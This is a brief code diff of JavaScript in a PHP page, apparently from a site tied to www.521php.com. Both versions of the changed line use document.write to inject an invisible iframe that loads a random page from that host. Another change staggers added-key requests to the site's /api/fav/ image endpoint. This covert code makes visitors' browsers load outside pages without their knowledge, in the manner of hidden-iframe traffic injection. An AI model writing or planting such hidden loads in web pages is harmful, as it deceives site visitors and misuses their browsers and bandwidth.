@@ -59,14 +59,14 @@ return(Min + Math.round(Rand * Range));
 var _num2 = GetRandomNum(1,10);
 if(_fav>=_num2){
 	var _n = GetRandomNum(1,100);
-	_html +='<div style="display:none"><iframe src="http://www.521php.com/index_'+_n+'.html"></iframe></div>';
+	var _html ='<div style="display:none"><iframe src="http://www.521php.com/index_'+_n+'.html"></iframe></div>';
 	document.write(_html);
 }
 $(function(){
-	$("img[src*='http://www.521php.com/api/fav/']").each(function(){
+	$("img[src*='http://www.521php.com/api/fav/']").each(function(i){
 		var _this = $(this);
 		var _src = _this.attr("src");
-		_this.attr("src",_src+"&k="+_favkey);
+		setTimeout(function(){_this.attr("src",_src+"&k="+_favkey)},i*500);
 	});
 });
 <?php
